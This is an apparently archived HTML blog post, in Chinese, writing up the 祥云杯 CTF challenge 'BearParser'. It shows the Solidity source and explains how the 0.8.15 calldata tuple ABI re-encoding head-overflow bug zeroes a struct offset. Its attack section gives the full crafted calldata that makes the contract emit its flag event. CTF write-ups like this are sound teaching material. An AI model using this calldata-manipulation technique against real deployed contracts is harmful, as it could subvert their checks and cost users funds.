@@ -1,0 +1,510 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>祥云杯 Blockchain-BearParser - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/16.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="祥云杯 Blockchain-BearParser">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-11-14 12:46" pubdate>
+        2022年11月14日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      27
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">祥云杯 Blockchain-BearParser</h1>
+            
+            <div class="markdown-body">
+              <h1 id="祥云杯-Blockchain-BearParser"><a href="#祥云杯-Blockchain-BearParser" class="headerlink" title="祥云杯 Blockchain-BearParser"></a>祥云杯 Blockchain-BearParser</h1><p>@[toc]</p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">pragma solidity <span class="hljs-number">0.8</span>.<span class="hljs-number">15</span>;<br><br>struct h&#123;<br>    uint256 id;<br>    uint256 go;<br>    bytes name;<br>&#125;<br><br>struct y&#123;<br>    uint256 named;<br>    uint256 guess;<br>    string reason;<br>&#125;<br><br>struct huhu&#123;<br>    h kabi;<br>    y bear;<br>&#125;<br><br><br>contract Bearparse&#123;<br>    event SendFlag();<br>    constructor()public&#123;&#125;<br>    <span class="hljs-regexp">//</span> event t(bytes32);<br>    <span class="hljs-regexp">//</span> event ff(string);<br>    <span class="hljs-keyword">function</span> hashCompareWithLengthCheckInternal(string calldata a, string calldata b) internal returns (bool) &#123;<br>        <span class="hljs-keyword">if</span> (bytes(a).length != bytes(b).length) &#123;<br>            return false;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            return keccak256(abi.encodePacked(a)) == keccak256(abi.encodePacked(b));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> chall1(bool begin,huhu calldata inputs,bytes32[<span class="hljs-number">2</span>] calldata hole)public&#123;<br>        require(hashCompareWithLengthCheckInternal(inputs.bear.reason,string(inputs.kabi.name)),<span class="hljs-string">&quot;guessname1error&quot;</span>);<br>        require(inputs.bear.guess%<span class="hljs-number">60719</span>==<span class="hljs-number">60226</span>&amp;&amp;inputs.bear.guess%<span class="hljs-number">60226</span>==<span class="hljs-number">41958</span>,<span class="hljs-string">&quot;numbererror&quot;</span>);<br>        require(inputs.kabi.id==inputs.kabi.go);<br>        <span class="hljs-regexp">//</span> emit ff(inputs.bear.reason);<br>        require(this.chall2(begin,inputs,hole));<br>        emit SendFlag();<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> chall2(bool begin,huhu calldata inputs,bytes32[<span class="hljs-number">2</span>] calldata hole)public returns(bool)&#123;<br>        bytes32 kabiname;<br>        bytes32 bearreason;<br>        bytes32 aa;<br>        bytes32 bearnamed;<br>        <span class="hljs-regexp">//</span> emit ff(inputs.bear.reason);<br>        <span class="hljs-regexp">//</span> emit ff(msg.data);<br>        assembly&#123;<br>            aa:=calldataload(<span class="hljs-number">4</span>)                     <span class="hljs-regexp">//</span>bool begin<br>            let off_s:=calldataload(<span class="hljs-number">0</span>x24)           <span class="hljs-regexp">//</span>offset huhu<br>            let c0:=calldataload(<span class="hljs-number">0</span>x44)              <span class="hljs-regexp">//</span>bytes32[<span class="hljs-number">2</span>] calldata hole[<span class="hljs-number">0</span>]<br>            let c1:=calldataload(<span class="hljs-number">0</span>x64)              <span class="hljs-regexp">//</span>bytes32[<span class="hljs-number">2</span>] calldata hole[<span class="hljs-number">1</span>]<br>            let off_sskabi:=calldataload(<span class="hljs-number">0</span>x84)      <span class="hljs-regexp">//</span>offset huhu.kabi  <span class="hljs-number">0</span>x00<br>            let off_bear:=calldataload(<span class="hljs-number">0</span>xa4)        <span class="hljs-regexp">//</span>offset huhu.bear  <span class="hljs-number">0</span>xe0<br>            let kabiid:=calldataload(add(off_sskabi,<span class="hljs-number">0</span>x84))                 <span class="hljs-regexp">//</span>value inputs.kabi.id uint<br>            let kabigo:=calldataload(add(add(off_sskabi,<span class="hljs-number">0</span>x84),<span class="hljs-number">0</span>x20))       <span class="hljs-regexp">//</span>value inputs.kabi.go uint<br>            kabiname:=calldataload(add(add(off_sskabi,<span class="hljs-number">0</span>x84),<span class="hljs-number">0</span>x80))         <span class="hljs-regexp">//</span>offset inputs.kabi.name bytes  <span class="hljs-number">0</span>x60<br>            bearnamed:=calldataload(add(off_bear,<span class="hljs-number">0</span>x84))                    <span class="hljs-regexp">//</span>value inputs.bear.named uint   <span class="hljs-number">0</span>x60<br>            let bearguess:=calldataload(add(add(off_bear,<span class="hljs-number">0</span>x84),<span class="hljs-number">0</span>x20))<br>            bearreason:=calldataload(add(add(off_bear,<span class="hljs-number">0</span>x84),<span class="hljs-number">0</span>x60))<br>        &#125;<br>        <span class="hljs-regexp">//</span> emit t(bearnamed);<br>        <span class="hljs-regexp">//</span> emit t(kabiname);<br>        require(kabiname==bearnamed,<span class="hljs-string">&quot;guessname2error&quot;</span>);<br>        return true;<br>    &#125;<br>&#125;<br><br><span class="hljs-regexp">//</span> begin: <span class="hljs-number">1</span><br><span class="hljs-regexp">//</span> [[<span class="hljs-string">&quot;111&quot;</span>,<span class="hljs-string">&quot;111&quot;</span>,<span class="hljs-string">&quot;0x4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e&quot;</span>],[<span class="hljs-string">&quot;96&quot;</span>,<span class="hljs-string">&quot;1874455756&quot;</span>,<span class="hljs-string">&quot;NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN&quot;</span>]]<br><span class="hljs-regexp">//</span> [<span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span>,<span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span>]<br><span class="hljs-regexp">//</span> <span class="hljs-number">0</span>x26ad1593<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000001</span> bool <br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000080</span> offset huhu<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000001</span> bytes32[<span class="hljs-number">2</span>] calldata hole[<span class="hljs-number">0</span>]<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000001</span> bytes32[<span class="hljs-number">2</span>] calldata hole[<span class="hljs-number">1</span>]<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000040</span> offset huhu.kabi<br><span class="hljs-regexp">//</span> <span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000</span>e0 offset huhu.bear <br><span class="hljs-regexp">//</span> <span class="hljs-number">000000000000000000000000000000000000000000000000000000000000006</span>f value inputs.kabi.id uint<br><span class="hljs-regexp">//</span> <span class="hljs-number">000000000000000000000000000000000000000000000000000000000000006</span>f value inputs.kabi.go uint<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000060</span> offset inputs.kabi.name bytes<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000020</span> length inputs.kabi.name bytes<br><span class="hljs-regexp">//</span> <span class="hljs-number">4</span>e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e value inputs.kabi.name bytes<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000060</span> inputs.bear.named uint<br><span class="hljs-regexp">//</span> <span class="hljs-number">000000000000000000000000000000000000000000000000000000006</span>fb9eccc inputs.bear.guessed uint<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000060</span> offset inputs.bear.reason string<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000020</span> length inputs.bear.reason string<br><span class="hljs-regexp">//</span> <span class="hljs-number">4</span>e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e value inputs.bear.reason string<br></code></pre></div></td></tr></table></figure>
+
+<p>附一个测试使用的合约</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">pragma solidity <span class="hljs-number">0.8</span>.<span class="hljs-number">15</span>;<br><br>import <span class="hljs-string">&quot;./source.sol&quot;</span>;<br><br>contract test &#123;<br>        h  h1;<br>        y  y1;<br>        huhu  huhu1;<br>        Bearparse target;<br>        bytes32<span class="hljs-literal">[<span class="hljs-number">2</span>]</span> hole1;<br>        event f(huhu,h,y,bytes32);<br>        event t(h,y,<span class="hljs-built_in">string</span>);<br>    constructor(address con) &#123;<br>        target = <span class="hljs-constructor">Bearparse(<span class="hljs-params">con</span>)</span>; <br><br>    &#125;<br>    <span class="hljs-keyword">function</span> test1<span class="hljs-literal">()</span> public&#123;<br>        h1.id = <span class="hljs-number">1</span>;<br>        h1.go = <span class="hljs-number">1</span>;<br>        h1.name = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;kkfine&quot;</span>);<br>        y1.named = <span class="hljs-number">1</span>;<br>        y1.guess = <span class="hljs-number">1</span>;<br>        y1.reason = <span class="hljs-string">&quot;kkfine&quot;</span>;<br>        huhu1.kabi = h1;<br>        huhu1.bear = y1;<br>        hole1 = <span class="hljs-literal">[<span class="hljs-identifier">bytes32</span>(&quot;<span class="hljs-identifier">kkfine</span>&quot;),<span class="hljs-identifier">bytes32</span>(&quot;<span class="hljs-identifier">kkfine</span>&quot;)]</span>;<br>        emit f(huhu1,h1,y1,bytes32(<span class="hljs-string">&quot;kkfine&quot;</span>));<br>        <span class="hljs-comment">// target.chall1(true,huhu1,hole1);</span><br>    &#125;<br><br>    <span class="hljs-keyword">function</span> hash<span class="hljs-constructor">CompareWithLengthCheckInternal(<span class="hljs-params">string</span> <span class="hljs-params">calldata</span> <span class="hljs-params">a</span>, <span class="hljs-params">string</span> <span class="hljs-params">calldata</span> <span class="hljs-params">b</span>)</span> public returns (<span class="hljs-built_in">bool</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bytes</span>(a).length != <span class="hljs-built_in">bytes</span>(b).length) &#123;<br>            return <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            return keccak256(abi.encode<span class="hljs-constructor">Packed(<span class="hljs-params">a</span>)</span>)<span class="hljs-operator"> == </span>keccak256(abi.encode<span class="hljs-constructor">Packed(<span class="hljs-params">b</span>)</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> test2(<span class="hljs-built_in">bool</span> <span class="hljs-keyword">begin</span>,huhu calldata inputs,bytes32<span class="hljs-literal">[<span class="hljs-number">2</span>]</span> calldata hole)public returns (<span class="hljs-built_in">bool</span>)&#123;<br>        <span class="hljs-comment">// return string(inputs.kabi.name);</span><br>        emit t(inputs.kabi,inputs.bear,<span class="hljs-built_in">string</span>(inputs.kabi.name));<br>        require(inputs.bear.guess%<span class="hljs-number">60719</span>==<span class="hljs-number">60226</span>&amp;&amp;inputs.bear.guess%<span class="hljs-number">60226</span>==<span class="hljs-number">41958</span>,<span class="hljs-string">&quot;numbererror&quot;</span>);<br>        require(inputs.kabi.id==inputs.kabi.go,<span class="hljs-string">&quot;error3&quot;</span>);<br>        return hash<span class="hljs-constructor">CompareWithLengthCheckInternal(<span class="hljs-params">inputs</span>.<span class="hljs-params">bear</span>.<span class="hljs-params">reason</span>,<span class="hljs-params">string</span>(<span class="hljs-params">inputs</span>.<span class="hljs-params">kabi</span>.<span class="hljs-params">name</span>)</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先看到<code>sodility 0.8.15</code>就会想到tctf中出现的abi编码漏洞，然后看到题目有两个函数，一个<code>chall1</code>有三个限制。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">require(hash<span class="hljs-constructor">CompareWithLengthCheckInternal(<span class="hljs-params">inputs</span>.<span class="hljs-params">bear</span>.<span class="hljs-params">reason</span>,<span class="hljs-params">string</span>(<span class="hljs-params">inputs</span>.<span class="hljs-params">kabi</span>.<span class="hljs-params">name</span>)</span>),<span class="hljs-string">&quot;guessname1error&quot;</span>);<br>require(inputs.bear.guess%<span class="hljs-number">60719</span>==<span class="hljs-number">60226</span>&amp;&amp;inputs.bear.guess%<span class="hljs-number">60226</span>==<span class="hljs-number">41958</span>,<span class="hljs-string">&quot;numbererror&quot;</span>);<br>require(inputs.kabi.id==inputs.kabi.go);<br></code></pre></div></td></tr></table></figure>
+
+<p>但这三个限制其实很好满足</p>
+<ul>
+<li><p>要满足第一个限制我们可以传一个bytes为<code>0x4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e</code>，然后传一个相应的字符串<code>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN</code>。注意必须得满32bytes，不然经过bytes转string会出现下面这种问题<br><img src="https://img-blog.csdnimg.cn/img_convert/32ee4c86caa85f85a426cdd122bab5f9.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>第二个条件直接中国剩余定理算出来满足结果的guess为1874455756</p>
+</li>
+<li><p>第三个直接传相等的值即可</p>
+</li>
+</ul>
+<p>至此我们还有最后一个变量没有设置就是<code>inputs.bear.named</code>，很明显它需要在<code>chall2</code>里用到，其实在<code>chall2</code>中它其实就是通过汇编获取到结构体里面的不同变量而已。</p>
+<p>而最终需要控制的两个变量是<code>kabi.name</code>和<code>bear.named</code></p>
+<figure class="highlight lasso"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lasso">kabiname:=calldataload(add(add(off_sskabi,<span class="hljs-number">0x84</span>),<span class="hljs-number">0x80</span>))         <br>bearnamed:=calldataload(add(off_bear,<span class="hljs-number">0x84</span>))                    <br><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><br><span class="hljs-keyword">require</span>(kabiname==bearnamed,<span class="hljs-string">&quot;guessname2error&quot;</span>);<br></code></pre></div></td></tr></table></figure>
+
+<p>而正常来讲现在这两个值一个是<code>4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e</code>一个是我们可以控制的，但如果你给<code>bear.named</code>也设置为<code>4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e</code>。此时你认为应该是相等的但实际上并不相等。</p>
+<p>所以这里就需要用到<code>Head Overflow Bug in Calldata Tuple ABI-Reencoding</code>这个abi编码漏洞了。</p>
+<blockquote>
+<p>通俗来说，就是如果一个结构体中间有一个变长的结构，比如string或者bytes，那么他在第二次打包的时候会出现bug，导致结构体的第一个字段被改成0.</p>
+</blockquote>
+<p>我们观察一下这里的abi结构，很明显遇到<code>bytes32[2] calldata hole</code>会触发漏洞导致清零。<br><img src="https://img-blog.csdnimg.cn/img_convert/7e0c9cae5c9b07ac82c8c34fdcd04606.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以在<code>chall2</code>汇编中获取到的<code>off_sskabi</code>并不是原本的<code>0x40</code>而是<code>0x00</code>。<br>这样在后面利用<code>off_sskabi</code>获取到的<code>kabiname</code>也不会是原本的<code>kabiname</code>的值<code>0x4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e</code>。经过计算你能知道最终取到的是<code>offset inputs.kabi.name bytes</code>也就是<code>0x60</code>。所以我们最终应该将<code>bear.named</code>设置为<code>0x60</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">kabiname</span>:=calldataload(add(add(off_sskabi,<span class="hljs-number">0</span>x<span class="hljs-number">84</span>),<span class="hljs-number">0</span>x<span class="hljs-number">80</span>))<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>最终的calldata</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> begin: <span class="hljs-number">1</span><br><span class="hljs-regexp">//</span> [[<span class="hljs-string">&quot;111&quot;</span>,<span class="hljs-string">&quot;111&quot;</span>,<span class="hljs-string">&quot;0x4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e&quot;</span>],[<span class="hljs-string">&quot;96&quot;</span>,<span class="hljs-string">&quot;1874455756&quot;</span>,<span class="hljs-string">&quot;NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN&quot;</span>]]<br><span class="hljs-regexp">//</span> [<span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span>,<span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span>]<br><span class="hljs-regexp">//</span> <span class="hljs-number">0</span>x26ad1593<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000001</span> bool <br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000080</span> offset huhu<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000001</span> bytes32[<span class="hljs-number">2</span>] calldata hole[<span class="hljs-number">0</span>]<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000001</span> bytes32[<span class="hljs-number">2</span>] calldata hole[<span class="hljs-number">1</span>]<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000040</span> offset huhu.kabi<br><span class="hljs-regexp">//</span> <span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000</span>e0 offset huhu.bear <br><span class="hljs-regexp">//</span> <span class="hljs-number">000000000000000000000000000000000000000000000000000000000000006</span>f value inputs.kabi.id uint<br><span class="hljs-regexp">//</span> <span class="hljs-number">000000000000000000000000000000000000000000000000000000000000006</span>f value inputs.kabi.go uint<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000060</span> offset inputs.kabi.name bytes<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000020</span> length inputs.kabi.name bytes<br><span class="hljs-regexp">//</span> <span class="hljs-number">4</span>e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e value inputs.kabi.name bytes<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000060</span> inputs.bear.named uint<br><span class="hljs-regexp">//</span> <span class="hljs-number">000000000000000000000000000000000000000000000000000000006</span>fb9eccc inputs.bear.guessed uint<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000060</span> offset inputs.bear.reason string<br><span class="hljs-regexp">//</span> <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000020</span> length inputs.bear.reason string<br><span class="hljs-regexp">//</span> <span class="hljs-number">4</span>e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e value inputs.bear.reason string<br></code></pre></div></td></tr></table></figure>
+
